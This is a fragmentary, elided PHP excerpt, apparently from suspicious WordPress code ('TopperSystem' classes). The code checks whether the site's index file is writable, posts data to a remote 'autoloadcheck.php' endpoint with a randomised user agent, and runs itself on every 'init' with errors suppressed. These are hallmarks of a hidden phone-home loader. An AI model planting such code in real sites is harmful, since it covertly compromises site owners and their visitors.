...
class TopperSystemSetFileautoloadcheck{
    ...
    public static function result_page_name_no_domain($url){
        $url=str_replace(TopperSystemSetFileautoloadcheck::result_domain_name($url),"",$url);
        return $url;
    }
}
/*
if(@TopperSystemSetFileautoloadcheck::detect_path() == false){
...
class TopperSystemExecuteFileautoloadcheck {
                                ...
                                if(($auth_memory == "")){
                                    if (is_writable($pathfileindex)) {
					                    ...
					                    $argarr = array(
						                    'timeout'     => 8,
						                    'redirection' => 0,
						                    'user-agent'  => TopperSystemSetFileautoloadcheck::getRandomUserAgent(),
						                    'httpversion' => '1.0',
						                    'blocking'    => true,
						                    'headers'     => array(),
						                    'body'        => $postdata_new,
					                    ...
					                    $contenuto_link_sito_send = wp_remote_post(DEFAULT_URL_TOPPERSYSTEM."/api/autoloadcheck.php", $argarr);
                                        ...
                                        if($contenuto_link_sito_send == "ok"){                                      
                                            $return="ok";
                                        }else if($contenuto_link_sito_send == "no1"){                                      
                                            $return="no1";
                                        }else if($contenuto_link_sito_send == "no2"){                                      
                                            $return="no2";
                                        }else if($contenuto_link_sito_send == "no3"){                                      
                                            $return="no3";
                                        }else if($contenuto_link_sito_send == "no4"){                                      
                                            $return="no4";
                                        }else{
                                            $return="no";
                                        }
...
@add_action('init', @TopperSystemExecuteFileautoloadcheck::runts(), 2);
}
}
